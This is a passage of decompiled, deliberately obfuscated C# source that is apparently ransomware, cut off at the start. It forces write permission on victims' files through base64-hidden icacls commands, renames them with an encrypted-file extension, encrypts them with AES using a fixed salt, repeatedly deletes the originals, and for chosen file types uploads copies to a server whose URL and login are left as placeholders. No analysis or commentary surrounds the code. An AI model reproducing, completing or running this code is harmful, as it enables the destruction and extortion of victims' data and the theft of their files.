								goto IL_07dd;
							}
							try
							{
								File.Move(item + AcpDpBwGGxENv, item);
							}
							catch (Exception)
							{
							}
							end_IL_0237_2:;
						}
						catch (Exception)
						{
							goto IL_07dd;
						}
					}
					continue;
					IL_07dd:
					GbPfxrUaDyLO.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(GbPfxrUaDyLO, delegate(string fileInfo)
		{
			if (QuGeJGfzYpw.Length != 0)
			{
				string[] array = QuGeJGfzYpw;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_08a9;
				}
			}
			try
			{
				if (fileInfo.EndsWith(AcpDpBwGGxENv))
				{
					goto IL_08a9;
				}
			}
			catch (Exception)
			{
				goto IL_08a9;
			}
			if (!wkqobNaWEQAr.Contains(fileInfo))
			{
				if (hhsicnCrwO == "YES")
				{
					try
					{
						if (EQEqEmYOniIYC.XFfMjPILkVPk(fileInfo))
						{
							EQEqEmYOniIYC.sHrqLuXhMISyN(fileInfo);
						}
					}
					catch
					{
					}
				}
				wkqobNaWEQAr.Add(fileInfo);
				if (!IVpIyrutgXnuTsdC.Contains(Path.GetDirectoryName(fileInfo)))
				{
					IVpIyrutgXnuTsdC.Add(Path.GetDirectoryName(fileInfo));
				}
				bqrcZqHppLszo(fileInfo);
				try
				{
					new cLbobpDMibcTXrjc().fntNupSZjyzZbqf(fileInfo);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (QPmKNZZswIrG)
							{
								Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						beVAbavcTbJwdi(PBGxcXGgCq("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + PBGxcXGgCq("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + PBGxcXGgCq("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (TQcDMEBrjpu)
					{
						try
						{
							File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_0284;
						}
						goto end_IL_0284_2;
						end_IL_0284:;
					}
					catch (Exception ex4)
					{
						if (TQcDMEBrjpu)
						{
							try
							{
								File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						jNleUmpCYwQx++;
						goto end_IL_0284_2;
					}
					if (XqxyjwNQsTVM == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(LvVedbSsouja) * 1024 * 1024)
					{
						try
						{
							if (AcpDpBwGGxENv != ".*")
							{
								if (MaDqJNywoPHCL)
								{
									AcpDpBwGGxENv = iWOdpoHPpDBfd + AcpDpBwGGxENv;
								}
								File.Move(fileInfo, fileInfo + AcpDpBwGGxENv);
							}
						}
						catch (Exception ex6)
						{
							if (TQcDMEBrjpu)
							{
								try
								{
									File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							jNleUmpCYwQx++;
							return;
						}
						if (AcpDpBwGGxENv != ".*")
						{
							fileInfo += AcpDpBwGGxENv;
						}
						if (iCDbdsmAlj == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in mmwwbJcgsinbY)
								{
									if (fileInfo.ToLower().EndsWith(item3 + AcpDpBwGGxENv) && JIGROLQVWX == "YES")
									{
										if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item3) && JIGROLQVWX == "NO")
									{
										try
										{
											JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = MRonfguJbWECp.vnojYkuiBAUr(32);
						string s = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = PQqYOcUkjAAf.ryXojQCHUSIHVk(fileInfo, Convert.ToInt32(LvVedbSsouja) * 1024 * 1024);
						if (!PQqYOcUkjAAf.fssENAeUQwBsQ(xYFPAYQKYUJrM: (!SzzYxwPSWbpgYR) ? (IMmsNGvAyQxjH ? PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(vjxWJqnUfim), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IMmsNGvAyQxjH ? ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(vjxWJqnUfim), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), QNRAGoVmrx: fileInfo, niyonyMvqJkwBDE: bytes))
						{
							try
							{
								File.Move(fileInfo + AcpDpBwGGxENv, fileInfo);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MaDqJNywoPHCL)
						{
							AcpDpBwGGxENv = iWOdpoHPpDBfd + AcpDpBwGGxENv;
						}
						string text2 = MRonfguJbWECp.vnojYkuiBAUr(32);
						string s2 = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (AcpDpBwGGxENv != ".*")
						{
							if (!bzjwNDHoswJy)
							{
								if (!IMmsNGvAyQxjH)
								{
									JfheapcdHpzRAd(fileInfo, fileInfo + AcpDpBwGGxENv, auZOEVqMqtXyYL);
								}
								else
								{
									JfheapcdHpzRAd(fileInfo, fileInfo + AcpDpBwGGxENv, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IMmsNGvAyQxjH)
									{
										GjEBWyngUynX(fileInfo, fileInfo + AcpDpBwGGxENv, auZOEVqMqtXyYL);
									}
									else
									{
										GjEBWyngUynX(fileInfo, fileInfo + AcpDpBwGGxENv, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (TQcDMEBrjpu)
									{
										try
										{
											File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while fully writing to file: " + ex9.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									jNleUmpCYwQx++;
									try
									{
										File.Move(fileInfo + AcpDpBwGGxENv, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!bzjwNDHoswJy)
						{
							if (!IMmsNGvAyQxjH)
							{
								JfheapcdHpzRAd(fileInfo, fileInfo + ".part", auZOEVqMqtXyYL);
							}
							else
							{
								JfheapcdHpzRAd(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IMmsNGvAyQxjH)
								{
									GjEBWyngUynX(fileInfo, fileInfo, auZOEVqMqtXyYL);
								}
								else
								{
									GjEBWyngUynX(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (TQcDMEBrjpu)
								{
									try
									{
										File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while fully writing to file: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								jNleUmpCYwQx++;
								return;
							}
						}
						if (IMmsNGvAyQxjH)
						{
							if (AcpDpBwGGxENv != ".*")
							{
								xfEbgIrugrgC(fileInfo + AcpDpBwGGxENv, bytes2);
							}
							else
							{
								xfEbgIrugrgC(fileInfo, bytes2);
							}
						}
					}
					end_IL_0284_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08a9;
			IL_08a9:
			GbPfxrUaDyLO.Remove(fileInfo);
		});
	}

	private static void uozfQwPuBRvilAJa(string QRTYnXlAkPeLfz, string UuffcixFnrGPh, byte[] kNGdLUGTKBQ)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(UuffcixFnrGPh, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(kNGdLUGTKBQ, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(QRTYnXlAkPeLfz, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (UuffcixFnrGPh.Length > 0)
				{
					FileStream fileStream3 = new FileStream(QRTYnXlAkPeLfz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (iCDbdsmAlj == "YES")
					{
						foreach (string item in mmwwbJcgsinbY)
						{
							if (QRTYnXlAkPeLfz.ToLower().EndsWith(item) && JIGROLQVWX == "YES")
							{
								if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", QRTYnXlAkPeLfz);
									}
									catch
									{
									}
								}
							}
							else if (QRTYnXlAkPeLfz.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
							{
								try
								{
									JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", QRTYnXlAkPeLfz);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(QRTYnXlAkPeLfz) && num2 >= 0)
							{
								File.Delete(QRTYnXlAkPeLfz);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (UuffcixFnrGPh.EndsWith(".part"))
					{
						File.Move(UuffcixFnrGPh, UuffcixFnrGPh.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(UuffcixFnrGPh);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void GjEBWyngUynX(string aLkRKTePosQ, string EkxGTDTYoAdZnM, byte[] PerHaegblJC)
	{
		try
		{
			if (iCDbdsmAlj == "YES")
			{
				FileStream fileStream = new FileStream(aLkRKTePosQ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in mmwwbJcgsinbY)
				{
					if (aLkRKTePosQ.ToLower().EndsWith(item) && JIGROLQVWX == "YES")
					{
						if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", aLkRKTePosQ);
							}
							catch
							{
							}
						}
					}
					else if (aLkRKTePosQ.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
					{
						try
						{
							JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", aLkRKTePosQ);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (aLkRKTePosQ != EkxGTDTYoAdZnM)
		{
			File.Move(aLkRKTePosQ, EkxGTDTYoAdZnM);
			aLkRKTePosQ = EkxGTDTYoAdZnM;
		}
		byte[] bytes = ixucTdEibmWxW.ZxKXvnZNRSzEAw(File.ReadAllBytes(aLkRKTePosQ), PerHaegblJC, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(aLkRKTePosQ, bytes);
		SSvZxDydUbgEQF++;
	}

	private static void JfheapcdHpzRAd(string pKnUbdaTtUR, string DFCoQUDhnAjH, byte[] NUYFMWeWUdLDt)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = DFCoQUDhnAjH;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(NUYFMWeWUdLDt, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (fujYaOkcjcopB == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(pKnUbdaTtUR, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(pKnUbdaTtUR, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(pKnUbdaTtUR, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (DFCoQUDhnAjH.Length > 0)
				{
					if (iCDbdsmAlj == "YES")
					{
						FileStream fileStream4 = new FileStream(pKnUbdaTtUR, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in mmwwbJcgsinbY)
						{
							if (pKnUbdaTtUR.ToLower().EndsWith(item) && JIGROLQVWX == "YES")
							{
								if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", pKnUbdaTtUR);
									}
									catch
									{
									}
								}
							}
							else if (pKnUbdaTtUR.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
							{
								try
								{
									JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", pKnUbdaTtUR);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(pKnUbdaTtUR);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (DFCoQUDhnAjH.EndsWith(".part"))
					{
						File.Move(DFCoQUDhnAjH, DFCoQUDhnAjH.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(DFCoQUDhnAjH))
							{
								File.Delete(DFCoQUDhnAjH);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(lNABZjYJLaAdehz, "File: " + pKnUbdaTtUR + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
